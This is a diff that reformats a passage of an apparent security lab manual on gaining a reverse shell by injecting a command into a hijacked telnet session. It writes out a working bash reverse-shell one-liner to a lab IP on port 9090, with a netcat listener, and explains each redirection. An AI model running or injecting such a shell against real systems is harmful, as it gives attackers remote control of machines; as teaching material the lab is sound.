@@ -141,89 +141,45 @@ Creating Reverse Shell using TCP Session Hijacking
 When attackers are able to inject a command to the victim’s machine using TCP session hijacking, they are not interested in running one simple command on the victim machine; they are interested in running many commands. Obviously, running these commands all through TCP session hijacking is inconvenient. What attackers want to achieve is to use the attack to set up a back door, so they can use this back door to conveniently continue to compromise the system.
 
 A typical way to set up back doors is to run a reverse shell from the victim achine to give the attacker a shell on the victim machine. A reverse shell is a shell process
-running on a remote machine,
+running on a remote machine, connecting back to the attacker’s machine. This gives an attacker a convenient way to access a remote machine once it has been compromised.
 
-connecting back to the attacker’s machine. This gives an attacker a convenient
-way to access a remote
-
-machine once it has been compromised.
-
-In the following, we show how we can set up a reverse shell if we can directly
-run a command on the
-
-victim’s machine (i.e. the server machine). In the TCP session hijacking attack,
-attackers cannot directly
-
-run a command on the victim’s machine, so their job is to run a reverse-shell
-command through the
-
-session hijacking attack. In this task, students need to demonstrate that they
-can achieve this goal.
+In the following, we show how we can set up a reverse shell if we can directly run a command on the victim’s machine (i.e. the server machine). In the TCP session hijacking attack, attackers cannot directly run a command on the victim’s machine, so their job is to run a reverse-shell command through the session hijacking attack. In this task, students need to demonstrate that they can achieve this goal.
 
 **Figure 4: Reverse shell connection to the listening netcat process**
 
-To have a bash shell on a remote machine connect back to the attacker’s machine,
-the attacker needs a
+To have a bash shell on a remote machine connect back to the attacker’s machine, the attacker needs a process waiting for some connection on a given port. In this example, we will use netcat. This program allows us to specify a port number and can listen for a connection on that port. In Figure 4(a), netcat (nc for short) is used to listen for a connection on port 9090. 
 
-process waiting for some connection on a given port. In this example, we will
-use netcat. This program
+In Figure 4(b), the /bin/bash command represents the command that would normally be executed on a compromised server.
 
-allows us to specify a port number and can listen for a connection on that port.
-In Figure 4(a), netcat (nc
-
-for short) is used to listen for a connection on port 9090. In Figure 4(b), the
-/bin/bash command
-
-represents the command that would normally be executed on a compromised server.
 This command has the following pieces:
+```
+ "/bin/bash -i": i stands for interactive, meaning that the shell must be interactive (must provide a shell prompt)
 
-• "/bin/bash -i": i stands for interactive, meaning that the shell must be
-interactive (must provide a shell prompt)
+ "> /dev/tcp/172.25.0.4/9090": This causes the output (stdout) of the shell to be redirected to the tcp connection to 172.25.0.4’s port 9090. The output stdout is represented by file descriptor number 1.
 
-• "\> /dev/tcp/172.25.0.4/9090": This causes the output (stdout) of the shell to
-be redirected to the tcp connection to 172.25.0.4’s port 9090. The output stdout is represented by file
-descriptor number 1.
-
-• "0\<&1": File descriptor 0 represents the standard input (stdin). This causes
-the stdin for the shell to be obtained from the tcp connection.
+ "0<&1": File descriptor 0 represents the standard input (stdin). This causes the stdin for the shell to be obtained from the tcp connection.
 
 (a) Use netcat to listen to connection
 
 (b) Run the reverse shell
 
-• "2\>&1": File descriptor 2 represents standard error stderr. This causes the
-error output to be redirected to the tcp connection.
+"2>&1": File descriptor 2 represents standard error stderr. This causes the error output to be redirected to the tcp connection.
+```
 
-In summary, "/bin/bash -i > /dev/tcp/172.25.0.4/9090 0<&1 2>&1" starts a bash
-shell, with its input coming from a tcp connection, and its standard and error outputs being
-redirected to the same tcp connection. In Figure 4(a), when the bash shell command is executed on the
-server (172.25.0.2), it connects back to the netcat process started on 172.25.0.4. This is confirmed via
-the "Connection 172.25.0.2 accepted" message displayed by netcat.
+In summary, "/bin/bash -i > /dev/tcp/172.25.0.4/9090 0<&1 2>&1" starts a bash shell, with its input coming from a tcp connection, and its standard and error outputs being
+redirected to the same tcp connection. In Figure 4(a), when the bash shell command is executed on the server (172.25.0.2), it connects back to the netcat process started on 172.25.0.4. This is confirmed via the "Connection 172.25.0.2 accepted" message displayed by netcat.
 
-The shell prompt obtained from the connection is now connected to the bash
-shell. This can be observed from the difference in the current working directory (printed via pwd). Before
-the connection was established, the pwd returned /home/ubuntu. Once netcat is connected to bash,
-pwd in the new shell returns /home/ubuntu/documents (directory corresponding to where /bin/bash is
-started from). We can also observe the host name displayed in the shell prompt is also changed from
-“attacker” to “server”. The output from netstat shows the established connection.
+The shell prompt obtained from the connection is now connected to the bash shell. This can be observed from the difference in the current working directory (printed via pwd). Before the connection was established, the pwd returned /home/ubuntu. Once netcat is connected to bash, pwd in the new shell returns /home/ubuntu/documents (directory corresponding to where /bin/bash is started from). We can also observe the host name displayed in the shell prompt is also changed from “attacker” to “server”. The output from netstat shows the established connection.
 
-The description above shows how you can set up a reverse shell if you have the
-access to the target machine, which is the telnet server in our setup, but in this task, you do not
-have such an access. Your task is to launch an TCP session hijacking attack on an existing telnet session
-between a user and the target server. You need to inject your malicious command into the hijacked
-session, so you can get a reverse shell on the target server. For this, you will require two virtual
-terminals connected to the attacker machine (one to run netcat, the other to send your spoofed packet). Get an
-additional terminal from the
+The description above shows how you can set up a reverse shell if you have the access to the target machine, which is the telnet server in our setup, but in this task, you do not have such an access. Your task is to launch an TCP session hijacking attack on an existing telnet session between a user and the target server. You need to inject your malicious command into the hijacked session, so you can get a reverse shell on the target server. For this, you will require two virtual terminals connected to the attacker machine (one to run netcat, the other to send your spoofed packet). Get an additional terminal from the Linux terminal window from which your ran the “start.py” command. From there type:
 
-Linux terminal window from which your ran the “start.py” command. From there
-type:
 ```
 $ moreterm.py tcpip attacker
 ```
+
 Lab Completion
 =====
-After finishing the lab, go to the terminal on your Linux system that was used
-to start the lab and type:
+After finishing the lab, go to the terminal on your Linux system that was used to start the lab and type:
 ```
 $ stoplab tcpip
 ```
